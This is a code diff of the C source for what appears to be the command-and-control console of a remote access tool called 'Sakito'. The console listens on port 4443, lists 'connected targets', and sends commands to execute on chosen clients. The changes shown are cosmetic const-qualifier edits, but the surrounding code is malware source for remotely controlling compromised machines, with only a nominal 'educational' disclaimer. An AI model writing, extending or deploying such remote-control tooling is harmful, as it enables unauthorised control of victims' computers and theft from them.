@@ -17,6 +17,7 @@ Use this code educationally/legally.
 	#include <pthread.h>
 	#include <string.h>
 #endif
+
 #include <stdio.h>
 #include <stdlib.h>
 #include <stdint.h>
@@ -27,7 +28,7 @@ Use this code educationally/legally.
 
 #define PORT 4443
 
-void add_client(Server_map* s_map, char* const host, int client_socket) {
+void add_client(Server_map* const s_map, char* const host, int client_socket) {
 	mutex_lock(s_map);
 
 	if (s_map->clients_sz == s_map->clients_alloc)
@@ -60,7 +61,7 @@ void bind_socket(const SOCKET listen_socket) {
 		terminate_server(listen_socket, "An error occured while placing the socket in listening state");
 }
 
-void sakito_accept_conns(Server_map *s_map) {
+void sakito_accept_conns(Server_map* const s_map) {
 	// Assign member values to connection map object/structure.
 	s_map->clients_alloc = MEM_CHUNK;
 	s_map->clients_sz = 0;
@@ -92,14 +93,14 @@ void sakito_accept_conns(Server_map *s_map) {
 	}
 }
 
-void host_chdir(Server_map *s_map) {
+void host_chdir(Server_map* const s_map) {
 	if (chdir(s_map->buf+3) == FAILURE) 
 		if (errno) 
 			fprintf(stderr, "%s: %s\n", s_map->buf+3, strerror(errno));
 }
 
 // Function to list/print all available connections to stdout.
-void list_connections(Server_map* s_map) {
+void list_connections(Server_map* const s_map) {
 	printf("\n\n---------------------------\n");
 	printf("---  C0NNECTED TARGETS  ---\n");
 	printf("--     Hostname: ID      --\n");
@@ -262,7 +263,7 @@ int client_exec(char* const buf, const size_t cmd_len, SOCKET client_socket) {
 	return SUCCESS;
 }
 
-void resize_conns(Server_map *s_map, int client_id) {
+void resize_conns(Server_map* const s_map, int client_id) {
 	// If there's more than one connection: resize the clients structure member values.
 	if (s_map->clients_sz > 1) {
 		int max_index = s_map->clients_sz-1;
@@ -278,7 +279,7 @@ void resize_conns(Server_map *s_map, int client_id) {
 }
 
 // Function to resize s_map array/remove and close connection.
-void delete_client(Server_map* s_map, const int client_id) {
+void delete_client(Server_map* const s_map, const int client_id) {
 	mutex_lock(s_map);
 
 	// If the file descriptor is open: close it.
@@ -293,7 +294,7 @@ void delete_client(Server_map* s_map, const int client_id) {
 }
 
 // Function to parse interactive input and send to specified client.
-void interact(Server_map* s_map) {
+void interact(Server_map* const s_map) {
 	int client_id = validate_id(s_map);
 
 	if (client_id == FAILURE) {
@@ -341,7 +342,7 @@ void interact(Server_map* s_map) {
 	delete_client(s_map, client_id);
 }
 
-void sakito_console(Server_map* s_map) {
+void sakito_console(Server_map* const s_map) {
 	// Saktio console loop.
 	while (1) {
 		get_cwd(s_map->buf);
